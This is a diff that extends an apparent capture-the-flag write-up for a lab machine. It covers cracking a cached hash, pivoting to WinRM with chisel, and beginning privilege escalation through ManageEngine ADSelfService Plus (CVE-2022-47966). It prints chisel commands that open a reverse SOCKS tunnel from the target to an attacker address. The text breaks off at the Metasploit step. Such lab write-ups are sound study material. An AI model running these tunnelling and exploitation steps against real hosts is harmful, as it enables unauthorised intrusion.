@@ -102,3 +102,40 @@ After checking i saw that `cache_cerberus.local.ldb` has an hash
 
 Then i cracked it and it belongs to user `matthew`
 ![image](https://user-images.githubusercontent.com/127159644/227749264-b16beab8-9eeb-4d54-9a6a-422541ee7a30.png)
+
+But where do we login from?
+
+Now i want to scan the whole host to know what ports are hosts are up
+
+Using nmap compiled binary i scanned the host and figured that winrm is open
+![image](https://user-images.githubusercontent.com/127159644/227749590-c14b2e92-50ec-4997-8dd2-333d727ff508.png)
+
+With this i can now port forward using chisel to my host then login to the winrm as user matthew
+![image](https://user-images.githubusercontent.com/127159644/227749695-19a8d29d-d16b-4dbf-b6f1-6f8597764201.png)
+
+So i logged in as user matthew to the winrm service
+![image](https://user-images.githubusercontent.com/127159644/227749766-ab9d6c82-c92d-4910-bdef-5d51215b3388.png)
+
+#### Privilege Escalation
+
+Checking `Program Files (x86)` I got `ManageEngine\ADSelfService Plus` 
+![image](https://user-images.githubusercontent.com/127159644/227749914-b740b10e-0ff3-4909-86fe-8b5cbd576056.png)
+
+Searching for exploit leads here [Resource](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)
+
+I'll port forward again using chisel in order to exploit the service running internally
+![image](https://user-images.githubusercontent.com/127159644/227750304-c7085dd0-fe09-40fd-8e04-2deb54df0ecf.png)
+
+```
+# Attacker
+chisel server -p 9090 --reverse
+
+# Target
+.\chisel-x64.exe client 10.10.14.175:9090 R:9091:socks
+```
+
+Since we need some requirements before exploitating the service lets get em
+
+Now i can use metasploit to exploit the service
+
+
